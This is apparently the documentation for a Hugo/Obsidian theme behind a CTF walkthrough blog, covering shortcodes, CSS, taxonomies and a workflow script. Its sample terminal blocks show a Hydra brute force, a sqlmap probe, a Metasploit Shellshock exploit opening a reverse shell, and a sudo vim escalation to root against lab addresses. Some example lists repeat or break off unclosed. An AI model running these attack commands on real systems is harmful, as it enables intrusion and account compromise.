- **Advanced**: Red badge, for complex, expert-level content

#### Usage

**In Hugo Markdown:**
```markdown
<div class="difficulty-badge difficulty-beginner">Beginner Level</div>
<div class="difficulty-badge difficulty-intermediate">Intermediate Level</div>
<div class="difficulty-badge difficulty-advanced">Advanced Level</div>
```

**Using Shortcode (Hugo mode):**
```markdown
{{< difficulty level="beginner" />}}
{{< difficulty level="intermediate" />}}
{{< difficulty level="advanced" label="Expert Level" />}}
```

**In Obsidian:**
```markdown
> [!info] Difficulty
> **Level:** Beginner
```

#### Styling (custom.css lines 300-330)
```css
.difficulty-badge {
    display: inline-block;
    padding: 0.4rem 0.8rem;
    border-radius: 4px;
    font-weight: 600;
    font-size: 0.875rem;
    margin: 0.5rem 0;
    transition: all 0.3s ease;
}

.difficulty-beginner {
    background-color: rgba(0, 255, 136, 0.2);
    color: var(--success-color);
    border: 1px solid var(--success-color);
}

.difficulty-intermediate {
    background-color: rgba(251, 191, 36, 0.2);
    color: var(--warning-color);
    border: 1px solid var(--warning-color);
}

.difficulty-advanced {
    background-color: rgba(255, 68, 68, 0.2);
    color: var(--danger-color);
    border: 1px solid var(--danger-color);
}
```

#### Visual Effects
- **Hover**: `transform: translateY(-2px)` and shadow
- **Focus**: Keyboard accessible with focus-visible
- **Transition**: Smooth 0.3s ease animation

### Callout Boxes

#### Purpose
Highlight important information with visual emphasis.

#### Types
1. **info**: General information (blue/cyan)
2. **warning**: Important warnings (yellow)
3. **success**: Success messages (green)
4. **danger**: Critical alerts (red)
5. **tip**: Helpful tips (green)
6. **question**: Common questions (blue)
7. **example**: Code examples (gray)
8. **note**: Important notes (blue)

#### Usage

**In Hugo Markdown:**
```html
<div class="callout callout-info">
  <div class="callout-title">📋 Information</div>
  <div class="callout-content">
    Your content here
  </div>
</div>

<div class="callout callout-warning">
  <div class="callout-title">⚠️ Warning</div>
  <div class="callout-content">
    Important warning
  </div>
</div>

<div class="callout callout-success">
  <div class="callout-title">✅ Success</div>
  <div class="callout-content">
    Success message
  </div>
</div>

<div class="callout callout-danger">
  <div class="callout-title">🚨 Danger</div>
  <div class="callout-content">
    Critical information
  </div>
</div>
```

**Using Shortcode:**
```markdown
{{< callout type="info" title="Information" >}}Your content{{< /callout >}}

{{< callout type="warning" title="Warning" >}}Be careful!{{< /callout >}}

{{< callout type="success" title="Success" >}}Task completed{{< /callout >}}

{{< callout type="danger" title="Danger" >}}Critical warning{{< /callout >}}

{{< callout type="tip" title="Pro Tip" >}}Helpful hint{{< /callout >}}

{{< callout type="question" title="Question" >}}What is this?{{< /callout >}}

{{< callout type="example" title="Example" >}}Code example{{< /callout >}}

{{< callout type="note" title="Note" >}}Important note{{< /callout >}}

{{< callout type="abstract" title="Abstract" >}}Summary{{< /callout >}}

{{< callout type="quote" title="Quote" >}}Quote{{< /callout >}}

{{< callout type="bug" title="Bug" >}}Bug report{{< /callout >}}

{{< callout type="todo" title="TODO" >}}Tasks{{< /callout >}}

{{< callout type="done" title="Done" >}}Completed{{< /callout >}}

{{< callout type="help" title="Help" >}}Assistance{{< /callout >}}

{{< callout type="failure" title="Failure" >}}Failed{{< /callout >}}

{{< callout type="missing" title="Missing" >}}Not found{{< /callout >}}

{{< callout type="idea" title="Idea" >}}Thought{{< /callout >}}

{{< callout type="quote" title="Quote" >}}Citation{{< /callout >}}

{{< callout type="cite" title="Cite" >}}Reference{{< /callout >}}

{{< callout type="comment" title="Comment" >}}Remark{{< /callout >}}

{{< callout type="quote" title="Quote" >}}Statement{{< /callout >}}

{{< callout type="abstract" title="Abstract" >}}Overview{{< /callout >}}

{{< callout type="info" title="Information" >}}Details{{< /callout >}}

{{< callout type="tip" title="Tip" >}}Suggestion{{< /callout >}}

{{< callout type="success" title="Success" >}}Achievement{{< /callout >}}

{{< callout type="question" title="Question" >}}Inquiry{{< /callout >}}

{{< callout type="warning" title="Warning" >}}Caution{{< /callout >}}

{{< callout type="danger" title="Danger" >}}Risk{{< /callout >}}

{{< callout type="bug" title="Bug" >}}Issue{{< /callout >}}

{{< callout type="example" title="Example" >}}Sample{{< /callout >}}

{{< callout type="note" title="Note" >}}Reminder{{< /callout >}}

{{< callout type="quote" title="Quote" >}}Excerpt{{< /callout >}}

{{< callout type="cite" title="Cite" >}}Source{{< /callout >}}

{{< callout type="comment" title="Comment" >}}Observation{{< /callout >}}

{{< callout type="idea" title="Idea" >}}Insight{{< /callout >}}

{{< callout type="done" title="Done" >}}Complete{{< /callout >}}

{{< callout type="help" title="Help" >}}Support{{< /callout >}}

{{< callout type="failure" title="Failure" >}}Error{{< /callout >}}

{{< callout type="missing" title="Missing" >}}Absent{{< /callout >}}

{{< callout type="todo" title="TODO" >}}Pending{{< /callout >}}

{{< callout type="quote" title="Quote" >}}Text{{< /callout >}}

{{< callout type="abstract" title="Abstract" >}}Brief{{< /callout >}}

{{< callout type="info" title="Information" >}}Data{{< /callout >}}

{{< callout type="tip" title="Tip" >}}Advice{{< /callout >}}

{{< callout type="success" title="Success" >}}Win{{< /callout >}}

{{< callout type="question" title="Question" >}}Query{{< /callout >}}

{{< callout type="warning" title="Warning" >}}
```

**In Obsidian:**
```markdown
> [!info] Title
> Content

> [!warning] Warning
> Be careful!

> [!success] Success
> Completed!

> [!danger] Danger
> Critical!
```

#### Styling (custom.css lines 380-430)
```css
.callout {
    padding: 1.25rem;
    border-radius: 8px;
    margin: 1.5rem 0;
    background-color: var(--tertiary-color);
    border-left: 4px solid;
    position: relative;
    overflow: hidden;
}

.callout::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    height: 4px;
    background: linear-gradient(90deg,
        transparent 0%,
        var(--accent-color) 50%,
        var(--accent-secondary) 100%);
    opacity: 0;
    transition: opacity 0.3s ease;
}

.callout:hover::before {
    opacity: 1;
}

.callout-info { border-left-color: var(--info-color); }
.callout-warning { border-left-color: var(--warning-color); }
.callout-success { border-left-color: var(--success-color); }
.callout-danger { border-left-color: var(--danger-color); }

.callout-title {
    font-weight: 600;
    margin-bottom: 0.5rem;
    font-size: 1.1rem;
}
```

### Code Blocks

#### Purpose
Display code with syntax highlighting and copy functionality.

#### Features
- Syntax highlighting (Prism.js integration via PaperMod)
- Copy buttons (JavaScript-powered)
- Line numbers
- Language specification
- Scrollable on overflow
- Responsive font sizing

#### Usage

**Standard Markdown:**
````markdown
```bash
nmap -sC -sV 10.10.10.10
```

```python
import socket
s = socket.socket()
s.connect(('10.10.10.10', 80))
```

```html
<div class="example">
    <p>Hello World</p>
</div>
```
````

**With Language:**
````markdown
```bash
#!/bin/bash
echo "Hello World"
```
````

**Shortcode Version:**
```markdown
{{< code language="bash" title="Port Scan Script" >}}nmap -sC -sV 10.10.10.10{{< /code >}}

{{< code language="python" title="Socket Connection" >}}import socket
s = socket.socket()
s.connect(('10.10.10.10', 80)){{< /code >}}
```

#### Styling (custom.css lines 100-180)
```css
pre {
    background-color: var(--tertiary-color);
    border: 1px solid var(--border-color);
    border-radius: 6px;
    padding: 1rem;
    overflow-x: auto;
    margin: 1.5rem 0;
    position: relative;
}

code {
    font-family: var(--code-font);
    background-color: var(--tertiary-color);
    padding: 0.2rem 0.4rem;
    border-radius: 3px;
    font-size: 0.9em;
    border: 1px solid var(--border-color);
}

/* Copy button styling */
.copy-button {
    position: absolute;
    top: 0.5rem;
    right: 0.5rem;
    background: var(--tertiary-color);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    padding: 0.4rem 0.6rem;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 0.4rem;
    font-size: 0.85rem;
    color: var(--text-color);
    transition: all 0.3s ease;
    opacity: 0;
}

pre:hover .copy-button {
    opacity: 1;
}
```

### Terminal Blocks

#### Purpose
Style terminal/console output with visual terminal window appearance.

#### Features
- Terminal window header with colored dots
- Prompt styling (user@host:path$)
- Copy command functionality
- Simulated terminal appearance
- Monospace font

#### Usage

**Shortcode:**
```markdown
{{< terminal command="nmap -sC -sV 10.10.10.10" >}}Starting Nmap 7.94 ( https://nmap.org )
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    Apache 2.4.54
139/tcp open  netbios-ssn Samba smbd 4.13{{< /terminal >}}

{{< terminal command="ssh user@10.10.10.10" >}}user@10.10.10.10's password: ********
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-147-generic x86_64){{< /terminal >}}

{{< terminal command="sudo -l" >}}Matching Defaults entries for user on host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User user may run the following commands on host:
    (ALL) NOPASSWD: ALL{{< /terminal >}}

{{< terminal command="cat /root/flag.txt" >}}HTB{flag_value_here}{{< /terminal >}}

{{< terminal command="id" >}}uid=0(root) gid=0(root) groups=0(root){{< /terminal >}}

{{< terminal command="uname -a" >}}Linux host 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 16:55:25 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux{{< /terminal >}}

{{< terminal command="whoami" >}}root{{< /terminal >}}

{{< terminal command="pwd" >}}/root{{< /terminal >}}

{{< terminal command="ls -la" >}}total 20
drwx------  2 root root 4096 Mar 22 09:00 .
drwxr-xr-x  3 user user 4096 Mar 22 08:59 ..
-rw-------  1 root root   32 Mar 22 09:00 flag.txt
-rw-r--r-- 1 root root  4096 Mar 21 16:55 script.py{{< /terminal >}}

{{< terminal command="python3 script.py" >}}Starting server on port 8080...
Listening on port 8080...{{< /terminal >}}

{{< terminal command="curl http://10.10.10.10" >}}<html>
<head><title>Test Page</title></head>
<body><h1>Hello World</h1></body>
</html>{{< /terminal >}}

{{< terminal command="dirb http://10.10.10.10 /usr/share/wordlists/dirb/common.txt" >}}-----------------
dirb 8.4.0
-----------------
START_TIME: Mon Nov  2 10:30:00 2025
URL_BASE: http://10.10.10.10/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

---- Scanning URL: http://10.10.10.10/ ----
+ http://10.10.10.10/admin (CODE:200|SIZE:1234)
+ http://10.10.10.10/login (CODE:200|SIZE:5678)
+ http://10.10.10.10/index.php (CODE:200|SIZE:9101){{< /terminal >}}

{{< terminal command="sqlmap -u 'http://10.10.10.10/login.php?id=1' --batch" >}}[+] testing connection to the target URL
[+] testing if the target URL content is stable
[+] target URL content is stable
[+] testing if parameter 'id' is dynamic
[+] parameter 'id' does not appear to be dynamic
[+] heuristic (basic) test shows that parameter 'id' might be injectable{{< /terminal >}}

{{< terminal command="john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" >}}Loaded 1 password hash (sha512crypt, $6$...)
Will run 2 OpenMP threads
Press 'q' to abort output, or any other key to continue
password123      (user){{< /terminal >}}

{{< terminal command="hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form '/login:username=^USER^&password=^PASS^:Invalid'" >}}Hydra v9.4 (c) 2022 by van Hauser/THC - Please do not use in military or secret service organizations
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-02 10:30:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.10:80/login
[80][http-post-form] host: 10.10.10.10   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found{{< /terminal >}}

{{< terminal command="msfconsole" >}}

   .:okOOOkdc'           'cdkkkkO.
 .:oOKWkKd:  .              dKkkkON.
  :oKWMNcd:   .              oWMMMWK:
 .:o0XWMMW0c.              :0NMMMMMMK:
   ;kMWNx::;.            ;OMMMMWMMMN:
    'kMMMNkd;           .kWMMMNMMXWMl'
     .oWMMMXd.         oWMMMMMMMMMMMXl'
       ;NMMMW0d:      cWMMMMMMMMMMMMMMd.
        .cKMMMO.     .kMMMMMMMMMMMMMMMK.
          'lONMMl   :WMMMMMMMMMMMMMMM0.
             .lkX'  .NMMMMMMMMMMMMMMX.
                .  .cMMMMMMMMMMMMMMN.
                      .lkKWMMMMMMXo.
                           .';:ccc:;'.


       =[ metasploit v6.3.4#0 ]          <{{ /terminal >}}

{{< terminal command="msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec" >}}msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.10.10
RHOSTS => 10.10.10.10
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set PAYLOAD cmd/unix/reverse_bash
PAYLOAD => cmd/unix/reverse_bash
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.10.10.11
LHOST => 10.10.10.11
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.10.10.11:4444
[*] Command Stager progress - 100.00% done (120/120 bytes)
[*] Sending stage (1017704 bytes) to 10.10.10.10
[*] Meterpreter session 1 opened (10.10.10.11:4444 -> 10.10.10.10:45678)

meterpreter > shell
Process 1337 created.
Channel 1 created.
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
${{< /terminal >}}

{{< terminal command="sudo -l" >}}sudo: unable to resolve host ubuntu: Temporary failure in name resolution
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/vim{{< /terminal >}}

{{< terminal command="sudo vim -c '!sh'" >}}sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
HTB{root_flag_here}{{< /terminal >}}

{{< terminal command="gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt" >}}Gobuster v3.5
=========================================
Starting gobuster in the directory enumeration mode
=========================================
http://10.10.10.10/admin                (Status: 200) [Size: 1234]
http://10.10.10.10/login.php            (Status: 200) [Size: 5678]
http://10.10.10.10/index.php            (Status: 200) [Size: 9101]
http://10.10.10.10/css/                 (Status: 403) [Size: 162]
http://10.10.10.10/js/                  (Status: 403) [Size: 162]
http://10.10.10.10/assets/              (Status: 403) [Size: 162]{{< /terminal >}}

{{< terminal command="ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.10/FUZZ" >}}        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__
       \ \ ,__\\ \ ,__/\ \/\ \ \ \ \_
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.10/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10 secs
 :: Threads          : 40
 :: Matcher          : Response status
 _________________________________________________

admin                    [Status: 200, Size: 1234, Words: 45, Lines: 23, Duration: 45ms]
login.php                [Status: 200, Size: 5678, Words: 78, Lines: 45, Duration: 67ms]
:: Progress: 9512 / 19269 (49.36%){{< /terminal >}}

{{< terminal command="nikto -h http://10.10.10.10" >}}- Nikto v2.1.6
---------------------------------------------------------------------------
Target IP:       10.10.10.10
Target Hostname: 10.10.10.10
Target Port:     80
---------------------------------------------------------------------------
Start Time:      2025-11-02 10:30:00
---------------------------------------------------------------------------
+ Server: Apache/2.4.54
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /login.php: This might be interesting...
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined.
+ The X-Content-Type-Options nosniff header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD{{< /terminal >}}

{{< terminal command="wpscan --url http://10.10.10.10 --api-token YOUR_TOKEN" >}}_______________________________________________________________   __        __           __       __  __
 ____  __  __ ____    ____  ___  __  __    ____  __  __  ____
 / ___||  |  |  _ \  / ___|/ _ \|  \/  |  / ___||  |  | / ___|
 \___ \| |  | | | | | |   | | | | |\/| | | |    | |  | | |
  ___) | |__| | |_| | |___| |_| | |  | | | |___ | |__| | |___
 |____/ \____/|____/  \____\___/|_|  |_|  \____|\____/ \____|
 _________________________________________________________________
             WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
    Sponsored by Automattic - https://automattic.com/
    @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_________________________________________________________________

Scan started: 2025-11-02 10:30:00

[+] WordPress version 5.8.2 identified from advanced fingerprinting
[+] WordPress theme in use: twentytwentytwo
[+] WordPress theme in use: twentytwentytwo - v1.2 (latest version)
[+] WordPress plugin in use: contact-form-7 v5.5.4
[+] WordPress plugin in use: akismet v4.2.1
[+] WordPress plugin in use: all-in-one-seo-pack v4.1.10

[!] No known vulnerabilities identified{{< /terminal >}}

This is a simulated terminal output with a realistic command-line interface. It shows the progression of a penetration test, from initial reconnaissance to privilege escalation.

The terminal shortcode is ideal for:
- CTF walkthroughs
- Penetration testing documentation
- Command-line tutorial outputs
- Shell session recordings

The key features of the terminal shortcode include:

1. **Visual Terminal Header**: The top section with three colored dots (red, yellow, green) mimics a standard terminal window appearance

2. **Command Display**: The command is shown with a stylized prompt including username, hostname, and path

3. **Output Area**: The main content area displays the actual output from the command execution

4. **Syntax Highlighting**: Both command and output are clearly distinguished through different styling

5. **Scrollable Output**: For longer outputs, the terminal area becomes scrollable

6. **Monospace Font**: Ensures proper alignment of output text

7. **Copy Functionality**: Users can easily copy commands from the terminal window

#### Styling (custom.css lines 200-250)
```css
.terminal-block {
    margin: 1.5rem 0;
    border-radius: 6px;
    overflow: hidden;
    border: 1px solid var(--border-color);
}

.terminal-header {
    background-color: var(--tertiary-color);
    padding: 0.5rem;
    display: flex;
    align-items: center;
    border-bottom: 1px solid var(--border-color);
}

.terminal-controls {
    display: flex;
    gap: 0.5rem;
}

.terminal-dot {
    width: 12px;
    height: 12px;
    border-radius: 50%;
}

.terminal-title {
    margin-left: 1rem;
    font-size: 0.875rem;
    color: var(--text-secondary);
}

.terminal {
    background-color: var(--primary-color);
    padding: 1rem;
    font-family: var(--code-font);
}

.prompt {
    margin-bottom: 0.5rem;
}

.user { color: var(--success-color); }
.path { color: var(--accent-secondary); }
.symbol { color: var(--text-muted); }
.command { color: var(--text-color); }
.output {
    color: var(--text-color);
    margin-left: 1.5rem;
}
```

### Tool Badges

#### Purpose
Highlight security tools and software mentioned in content.

#### Features
- Small, pill-shaped badges
- Color-coded by tool type
- Hover effects
- Keyboard accessible
- Can be used inline with text

#### Usage

**Shortcode:**
```markdown
In this walkthrough, we'll use {{< tool tool="nmap" />}} for port scanning and {{< tool tool="burp suite" />}} for web application testing.

Tools used:
- {{< tool tool="nmap" />}}
- {{< tool tool="gobuster" />}}
- {{< tool tool="nikto" />}}
- {{< tool tool="sqlmap" />}}
- {{< tool tool="metasploit" />}}
```

**Inline:**
```markdown
We can use {{< tool tool="nmap" />}} to enumerate open ports.
```

**Obsidian:**
```markdown
> [!example] Tools Used
> {{tool "nmap"}} {{tool "burp suite"}} {{tool "sqlmap"}}
```

#### Styling (custom.css lines 350-380)
```css
.tool-badge {
    display: inline-block;
    padding: 0.3rem 0.6rem;
    background-color: var(--tertiary-color);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    font-size: 0.75rem;
    font-weight: 500;
    margin: 0.2rem;
    transition: all 0.3s ease;
}

.tool-badge:hover {
    background-color: var(--accent-color);
    color: var(--primary-color);
    border-color: var(--accent-color);
    transform: translateY(-1px);
}
```

### Table of Contents

#### Purpose
Automatically generate navigation for long posts.

#### Features
- Auto-generated from h2/h3 headings
- Nested structure support
- Smooth scroll to sections
- Mobile responsive
- Always visible on desktop

#### Usage

Enable in hugo.toml (already enabled):
```toml
[params]
  showtoc = true
```

TOC appears on posts with multiple sections.

#### Styling
TOC styling is handled by PaperMod theme with custom overrides in custom.css.

---

## 8. Taxonomy System

### Overview

The blog uses Hugo's taxonomy system to organize and classify content. Taxonomies are classifications that can be applied to content.

**5 Custom Taxonomies:**
1. Categories (broad content types)
2. Tags (flexible keywords)
3. Difficulties (skill levels)
4. Platforms (CTF/training platforms)
5. Tools (software/tools mentioned)

### How Taxonomies Work

#### Structure

```
Taxonomy
├── Term (e.g., "nmap")
│   └── Page (post that uses this term)
├── Term (e.g., "burp suite")
│   └── Page (post that uses this term)
└── Term (e.g., "metasploit")
    └── Page (post that uses this term)
```

#### Front Matter Example

```yaml
---
title: "HackTheBox Lame Walkthrough"
date: 2025-11-02
categories: ["CTF", "Walkthrough"]
tags: ["nmap", "enumeration", "samba"]
difficulties: ["beginner"]
platforms: ["HackTheBox"]
tools: ["nmap", "smbclient", "metasploit"]
description: "Complete walkthrough of the HackTheBox Lame machine"
---
```

### Categories

#### Purpose
Broad classification of content type.

#### Predefined Values
```yaml
categories: ["CTF", "Tutorial", "Analysis", "Walkthrough", "General"]
```

#### Usage Examples

**CTF Category:**
```yaml
categories: ["CTF", "Walkthrough"]
```
Use for: CTF machine walkthroughs, challenge solutions

**Tutorial Category:**
```yaml
categories: ["Tutorial"]
```
Use for: Educational content, how-to guides

**Analysis Category:**
```yaml
categories: ["Analysis", "Research"]
```
Use for: Security research, vulnerability analysis, malware analysis

#### Display
- **Page**: `yourdomain.com/categories/ctf/`
- **Lists all posts** in the CTF category
- **Alphabetically sorted**

### Tags

#### Purpose
Flexible keyword tagging for cross-cutting content classification.

#### Characteristics
- **Unlimited values**: Create any tag you need
- **No predefined list**: User-defined
- **Multiple tags per post**: Yes (array)
- **Flexible**: Use for anything (techniques, technologies, etc.)

#### Common Tags
```yaml
# Tools
tags: ["nmap", "burp-suite", "sqlmap", "metasploit"]

# Techniques
tags: ["enumeration", "web-app", "buffer-overflow", "reverse-shell"]

# Technologies
tags: ["linux", "windows", "http", "ssh", "ftp", "smb"]

# Vulnerability Types
tags: ["sql-injection", "xss", "csrf", "rce", "lfi", "rfi"]

# Topics
tags: ["cryptography", "steganography", "forensics", "malware"]
```

#### Usage Examples

**Single Tag:**
```yaml
tags: ["nmap"]
```

**Multiple Tags:**
```yaml
tags: ["nmap", "enumeration", "network-security"]
```

**Tags with Special Characters:**
```yaml
tags: ["web-application", "sql-injection", "cross-site-scripting"]
```

#### Display
- **Page**: `yourdomain.com/tags/nmap/`
- **Lists all posts** with this tag
- **Tag cloud**: Shows all tags with counts

### Difficulties

#### Purpose
Indicate skill level required for content.

#### Predefined Values
```yaml
difficulties: ["beginner", "intermediate", "advanced"]
```

#### Difficulty Definitions

**Beginner:**
- No prior experience required
- Basic concepts explained
- Step-by-step instructions
- Suitable for newcomers

**Intermediate:**
- Some experience helpful
- Moderate complexity
- Assumes basic knowledge
- Building on fundamentals

**Advanced:**
- Requires experience
- Complex techniques
- Minimal hand-holding
- Expert-level content

#### Usage

```yaml
difficulties: ["beginner"]

difficulties: ["intermediate"]

difficulties: ["advanced"]
```

#### Display

**Badge Display:**
```html
<div class="difficulty-badge difficulty-beginner">Beginner Level</div>
```

**Page**: `yourdomain.com/difficulties/beginner/`

### Platforms

#### Purpose
Identify CTF/training platforms.

#### Predefined Values
```yaml
platforms: ["HackTheBox", "TryHackMe", "picoCTF", "VulnHub", "General"]
```

#### Platform Descriptions

**HackTheBox:**
- Popular CTF platform
- Active machines
- Difficulty-based progression
- Experienced community

**TryHackMe:**
- Beginner-friendly
- Guided learning paths
- Virtual machines
- Educational focus

**picoCTF:**
- Educational CTF
- Free platform
- Classroom-friendly
- Competition-based

**VulnHub:**
- Downloadable VMs
- Various sources
- Offline practice
- Self-hosted

**General:**
- Non-platform specific
- Custom labs
- Real-world scenarios
- Generic content

#### Usage Examples

```yaml
platforms: ["HackTheBox"]

platforms: ["TryHackMe"]

platforms: ["VulnHub"]

platforms: ["General"]
```

#### Display
- **Page**: `yourdomain.com/platforms/hackthebox/`
- **Lists all posts** for specific platform

### Tools

#### Purpose
Track security tools and software mentioned in content.

#### Characteristics
- **User-defined**: Any tool name
- **Auto-extraction**: Python converter extracts from content
- **Multiple tools**: Yes (array)
- **Flexible**: Can be any software

#### Common Tools

**Reconnaissance:**
```yaml
tools: ["nmap", "masscan", "zmap", "unicornscan", "rustscan"]
```

**Web Testing:**
```yaml
tools: ["burp suite", "owasp zap", "dirb", "gobuster", "dirsearch", "nikto", "wpscan"]
```

**Exploitation:**
```yaml
tools: ["metasploit", "exploitdb", "searchsploit", "msfvenom", "netcat", "socat"]
```

**Password Attacks:**
```yaml
tools: ["hashcat", "john", "hydra", "medusa", "ncrack"]
```

**Post-Exploitation:**
```yaml
tools: ["linpeas", "winpeas", "pspy", "gtfobins", "lolbas"]
```

**Forensics:**
```yaml
tools: ["volatility", "autopsy", "binwalk", "strings", "hexdump"]
```

#### Usage

```yaml
tools: ["nmap", "burp suite", "metasploit"]

tools: ["nmap", "gobuster", "sqlmap"]
```

#### Auto-Extraction

The Python converter can automatically detect and extract tools from content:

**Enabled in config.yaml:**
```yaml
auto_extract_tools: true
```

**Detection Patterns:**
- `tool()` badges
- Tool references in text
- Code block mentions
- Special keywords

#### Display
- **Page**: `yourdomain.com/tools/nmap/`
- **Tool Badge**: Inline display in posts
- **Tool Listing**: Shows all tools used

### Creating Taxonomy Pages

Taxonomy pages are automatically generated by Hugo from the taxonomy structure:

**URL Pattern:**
- Categories: `/categories/`
- Tags: `/tags/`
- Difficulties: `/difficulties/`
- Platforms: `/platforms/`
- Tools: `/tools/`

**Example URLs:**
```
https://yourdomain.com/categories/ctf/
https://yourdomain.com/tags/nmap/
https://yourdomain.com/difficulties/beginner/
https://yourdomain.com/platforms/hackthebox/
https://yourdomain.com/tools/nmap/
```

### Customizing Taxonomies

#### Adding New Taxonomy

**Step 1: Add to hugo.toml:**
```toml
[taxonomies]
  tag = "tags"
  category = "categories"
  difficulty = "difficulties"
  platform = "platforms"
  tool = "tools"
  # Add new taxonomy
  series = "series"
```

**Step 2: Use in front matter:**
```yaml
---
title: "My Post"
series: ["Advanced Penetration Testing"]
---
```

#### Disabling Taxonomies

Comment out in hugo.toml:
```toml
[taxonomies]
  tag = "tags"
  category = "categories"
  # Comment out unused taxonomies
  # difficulty = "difficulties"
```

#### Custom Template for Taxonomies

**Create** `layouts/_default/terms.html`:
```html
{{ define "main" }}
<article class="taxonomy-page">
    <header class="page-header">
        <h1>{{ .Title }}</h1>
        <p>{{ .Params.description }}</p>
    </header>

    <div class="taxonomy-grid">
        {{ range .Data.Terms.Alphabetical }}
        <div class="taxonomy-card">
            <h2>
                <a href="{{ .Page.RelPermalink }}">
                    {{ .Page.Title }}
                </a>
            </h2>
            <div class="taxonomy-meta">
                <span class="count">{{ len .Pages }} posts</span>
            </div>
            <div class="taxonomy-description">
                {{ .Page.Summary }}
            </div>
        </div>
        {{ end }}
    </div>
</article>
{{ end }}
```

### Best Practices

#### 1. Use Consistent Naming

**Good:**
```yaml
tools: ["nmap", "burp suite", "metasploit"]
tags: ["enumeration", "web-security"]
```

**Bad:**
```yaml
tools: ["Nmap", "BurpSuite", "MSF"]  # Inconsistent casing
tags: ["enum", "web", "pentest"]     # Abbreviations
```

#### 2. Use Established Taxonomies

**Before creating new, check existing:**
- Difficulties: Stick to beginner/intermediate/advanced
- Platforms: Use standard platform names
- Categories: Use predefined categories

#### 3. Don't Over-Use Tags

**Recommended:** 3-8 tags per post

**Too Many:**
```yaml
tags: ["linux", "ubuntu", "debian", "redhat", "fedora", "centos"]
```

**Better:**
```yaml
tags: ["linux"]
```

#### 4. Auto-Extract When Possible

Enable in config.yaml:
```yaml
auto_extract_tools: true
auto_extract_platforms: true
auto_extract_difficulty: true
```

This reduces manual front matter editing.

#### 5. Document Your Taxonomies

Maintain a taxonomy guide for consistency:
- Standard values
- Naming conventions
- Usage examples

---

## 9. Scripts & Automation

### workflow.sh - Main Automation Script

#### Purpose
Orchestrate the entire Obsidian-to-Hugo workflow with commands for setup, conversion, serving, and building.

#### Location
`/home/hrithik/gemini/Hri7hik_H4cks/scripts/workflow.sh`

#### Features
- Colored output for easy reading
- Dependency checking
- Error handling
- Command-line interface
- Integration with Python converter and Hugo

#### Commands

**1. Setup**
```bash
./scripts/workflow.sh setup
```
**Purpose**: Initialize directory structure
**Actions**:
- Create `obsidian-vault/posts/`
- Create `obsidian-vault/attachments/`
- Create `static/images/`
- Verify directories exist

**When to use**: First time setup, after cloning repository

**2. Convert**
```bash
./scripts/workflow.sh convert
```
**Purpose**: Convert Obsidian notes to Hugo
**Actions**:
- Check dependencies
- Setup directories
- Run Python converter
- Process all .md files in obsidian-vault/posts/

**When to use**: After creating/editing Obsidian notes, before previewing

**3. Serve**
```bash
./scripts/workflow.sh serve
```
**Purpose**: Start development server
**Actions**:
- Check dependencies
- Convert notes
- Start Hugo server on http://localhost:1313
- Enable drafts, expired, and future posts

**When to use**: Local development, previewing changes

**4. Build**
```bash
./scripts/workflow.sh build
```
**Purpose**: Build production site
**Actions**:
- Check dependencies
- Convert notes
- Build with Hugo (minified)
- Include expired and future posts
- Output to public/

**When to use**: Before deploying, creating production build

**5. Watch**
```bash
./scripts/workflow.sh watch
```
**Purpose**: Monitor for changes and auto-convert
**Actions**:
- Setup directories
- Monitor obsidian-vault/posts/
- Auto-convert on file changes
- Efficient file watching (inotify) or polling

**When to use**: Active writing/editing, continuous workflow

**6. Clean**
```bash
./scripts/workflow.sh clean
```
**Purpose**: Remove generated content
**Actions**:
- Delete content/posts/*
- Delete static/images/*

**When to use**: Resetting, troubleshooting, before fresh conversion

**7. Check**
```bash
./scripts/workflow.sh check
```
**Purpose**: Verify dependencies
**Checks**:
- Python 3 installed
- Hugo installed
